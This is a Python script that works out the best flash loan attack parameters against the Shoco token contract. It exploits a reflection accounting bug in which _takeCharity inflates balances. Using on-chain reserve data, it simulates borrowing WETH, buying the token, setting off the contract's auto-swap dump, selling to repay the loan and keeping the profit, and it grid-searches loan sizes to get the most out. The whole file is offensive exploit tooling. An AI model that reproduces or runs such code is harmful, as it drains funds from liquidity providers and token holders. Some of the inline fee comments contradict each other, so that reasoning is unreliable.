#!/usr/bin/env python3
"""
Compute optimal flash loan attack parameters for the Shoco reflection accounting bug.
The bug: _takeCharity adds to _rOwned[contract] without reducing _rTotal, causing ~10,969x
inflation in all balanceOf values. The Uniswap pair sees massively inflated reserves,
making SHOCO extremely cheap to buy.
"""

# On-chain data (from cast calls)
TOTAL_SUPPLY = 1_000_000_000_000_000_000_000_000  # 1e24
WETH_RESERVE = 410_229_050_548_786  # ~0.00041 WETH
SHOCO_RESERVE = 10_969_257_272_155_594_737_045_478_886  # ~1.097e28 (INFLATED)
CONTRACT_BALANCE = 9_669_046_239_181_169_132_111_568_826  # ~9.67e27

# Fee structure
TAX_FEE = 1  # 1% reflection
TEAM_DEV = 8  # 8% charity to contract
TOTAL_FEE = 9  # 9% total

# Auto-swap threshold
SWAP_THRESHOLD = 5_000_000_000_000_000_000  # 5e18

MIN_EXPECTED_PROFIT = 1_000_000_000_000_000  # 1e15

def get_amount_out(amount_in, reserve_in, reserve_out):
    """Uniswap V2 getAmountOut"""
    amount_in_with_fee = amount_in * 997
    numerator = amount_in_with_fee * reserve_out
    denominator = reserve_in * 1000 + amount_in_with_fee
    return numerator // denominator

def get_amount_in(amount_out, reserve_in, reserve_out):
    """Uniswap V2 getAmountIn"""
    numerator = reserve_in * amount_out * 1000
    denominator = (reserve_out - amount_out) * 997
    return numerator // denominator + 1

def simulate_attack(loan_amount_wei, buy_divisor):
    """
    Simulate flash loan attack:
    1. Flash loan `loan_amount_wei` WETH from WETH-USDC pool
    2. Buy SHOCO with buyAmount = loan_amount / buyDivisor WETH
    3. Contract accumulates 8% charity from buy
    4. Sell SHOCO to get WETH for repayment (triggers auto-swap)
    5. Repay flash loan with fee (0.3%)
    6. Keep remaining SHOCO as profit
    """
    # Flash loan repayment
    repay_amount = (loan_amount_wei * 1000) // 997 + 1
    
    # Buy amount
    buy_amount = loan_amount_wei // buy_divisor
    if buy_amount < 200_000_000_000_000:  # MIN_BUY_WETH
        buy_amount = 200_000_000_000_000
    
    if buy_amount >= loan_amount_wei:
        return 0, "buy too large"
    
    # Available WETH after buy
    available_weth = loan_amount_wei - buy_amount
    
    # Simulate buy: swap WETH -> SHOCO
    # After the inflated reserves, the buy gets a lot of SHOCO
    shoco_bought = get_amount_out(buy_amount, WETH_RESERVE, SHOCO_RESERVE)
    
    # After buy: reserves update
    # NOTE: The buy itself pays 9% fee (1% reflect + 8% charity)
    # The pair's actual SHOCO balance decreases by shoco_bought (output from swap)
    # But the pair sends shoco_bought, of which only 91% reaches buyer due to fee
    # Wait, the pair sends tokens via transfer, but Shoco's _transfer takes 9% fee
    # So the buyer receives only 91% of shoco_bought
    shoco_received = shoco_bought * 91 // 100  # After 9% fee
    
    # Post-buy reserves
    weth_after_buy = WETH_RESERVE + buy_amount
    shoco_after_buy = SHOCO_RESERVE - shoco_bought
    
    # Contract accumulated charity from buy: 8% of shoco_bought
    # But the contract balance is already massive due to inflation
    # The auto-swap will fire on any non-pair transfer
    
    # Simulate auto-swap dump of contract tokens
    # Contract sells ALL its tokens for WETH
    weth_from_dump = get_amount_out(CONTRACT_BALANCE, shoco_after_buy, weth_after_buy)
    
    if weth_from_dump >= weth_after_buy:
        return 0, "dump drains pool completely"
    
    # Post-dump reserves
    shoco_after_dump = shoco_after_buy + CONTRACT_BALANCE
    weth_after_dump = weth_after_buy - weth_from_dump
    
    # How much more WETH do we need?
    need_more_weth = repay_amount - available_weth if repay_amount > available_weth else 0
    
    if need_more_weth > 0:
        # Calculate how much SHOCO to sell to get need_more_weth WETH
        # This sell also triggers auto-swap again, but the contract balance was
        # just emptied, so no more auto-swap
        
        # Account for 9% fee on sell (1% reflect + 8% charity)
        # When selling, the pair receives only 91% of the gross amount
        # But getAmountIn computes the gross amount needed
        shoco_needed_gross = get_amount_in(need_more_weth, shoco_after_dump, weth_after_dump)
        
        # The seller pays 9% fee, so to send shoco_needed_gross to pair,
        # the seller must have more. But the router handles this...
        # Actually, swapExactTokensForTokensSupportingFeeOnTransferTokens handles the fee:
        # it measures actual balance received by pair.
        # For simplicity, we account for the 8% charity + 1% reflect
        # The seller sends gross, pair receives net = gross * 0.91
        # But getAmountIn already gives us the gross input needed for the swap
        # to produce need_more_weth output, assuming no fees.
        # With fees, we need to send more.
        
        # Actually, the SupportingFeeOnTransferTokens function handles this:
        # It transfers tokens first, measures what the pair received, then calls swap
        # So the "amount in" for the constant product formula is the NET amount received by pair
        # The seller sends grossShocoToSell, pair receives net = grossShocoToSell * 0.91
        # So we need: getAmountIn(needMoreWeth, reserveIn, reserveOut) = net received
        # grossShocoToSell = net / 0.91
        
        net_shoco_needed = get_amount_in(need_more_weth, shoco_after_dump, weth_after_dump)
        # Gross up for fee
        gross_shoco_to_sell = (net_shoco_needed * 100 + 98) // 99  # / 0.99 (only 1% reflect removed? No, 9% total)
        
        # Actually for the pair: the seller sends tokens, 9% is taken as fee
        # 1% is reflected (burned from _rTotal), 8% goes to contract
        # The pair receives: original_amount - 9% fee in t-space? 
        # No, the _transfer reduces sender's balance by rAmount, recipient gets rTransferAmount = rAmount - rFee
        # In t-space: sender sends tAmount, recipient gets tTransferAmount = tAmount * 0.91
        # But the reflect fee (1%) changes the rate, complicating things
        # 
        # For the pair receiving tokens: the pair's _rOwned increases by rTransferAmount
        # In t-space via balanceOf: rTransferAmount / newRate
        # This is approximately tAmount * 0.99 (not 0.91) because only the 1% reflect is
        # accounted for in rTransferAmount, while the 8% charity is "lost" to the contract
        # but not deducted from rTransferAmount!
        #
        # THIS IS THE BUG! The pair receives tAmount * 0.99 in r-space terms, not 0.91!
        # The 8% charity is given to the contract WITHOUT reducing what the recipient gets.
        
        # So the net amount the pair receives is ~99% of the gross (only 1% reflect fee accounted)
        # The 8% charity is "printed" to the contract
        
        # For the constant-product formula, the "amount in" for the pair is what the pair RECEIVES
        # which is rTransferAmount / rate ≈ tAmount * 0.99
        
        # So gross = net / 0.99
        gross_shoco_to_sell = (net_shoco_needed * 100 + 98) // 99  # / 0.99 for 1% reflect
        
        if gross_shoco_to_sell + MIN_EXPECTED_PROFIT > shoco_received:
            return 0, f"repayment consumes profit: need {gross_shoco_to_sell}, have {shoco_received}"
        
        profit = shoco_received - gross_shoco_to_sell
    else:
        profit = shoco_received
    
    if profit < MIN_EXPECTED_PROFIT:
        return profit, "profit too low"
    
    return profit, "OK"

# Test various parameters
print("Testing attack parameters...")
print(f"WETH reserve: {WETH_RESERVE} ({WETH_RESERVE/1e18:.6f} WETH)")
print(f"SHOCO reserve (inflated): {SHOCO_RESERVE}")
print(f"Contract balance (inflated): {CONTRACT_BALANCE}")
print()

# The key issue: with 10,969x inflation, even tiny buy amounts get huge SHOCO
# But the WETH in the pool is only 0.00041 WETH, so the attack is capped

# Test with very small buys
loans = [3_000_000_000_000_000, 5_000_000_000_000_000, 8_000_000_000_000_000,
         12_000_000_000_000_000, 16_000_000_000_000_000, 24_000_000_000_000_000,
         32_000_000_000_000_000]
divisors = [64, 48, 40, 32, 24, 16]

best_profit = 0
best_params = None

for loan in loans:
    for div in divisors:
        profit, status = simulate_attack(loan, div)
        if profit > best_profit:
            best_profit = profit
            best_params = (loan, div, profit, status)

print(f"Best result: loan={best_params[0]}, divisor={best_params[1]}, profit={best_params[2]}, status={best_params[3]}")
print(f"Profit in SHOCO: {best_profit}")
print(f"Profit in 'real' terms (deflated): {best_profit / 10969:.0f} SHOCO")

# Also compute the economic extractable value
# The pair has ~0.00041 WETH. That's the maximum extractable.
print(f"\nMaximum extractable WETH: {WETH_RESERVE/1e18:.6f} WETH")
print("The auto-swap alone extracts ~50% of this (half to team dev, half stuck in contract)")
print(f"Auto-swap WETH to contract: ~{WETH_RESERVE/2/1e18:.6f} WETH")
print(f"Auto-swap WETH to team dev: ~{WETH_RESERVE/2/1e18:.6f} WETH")
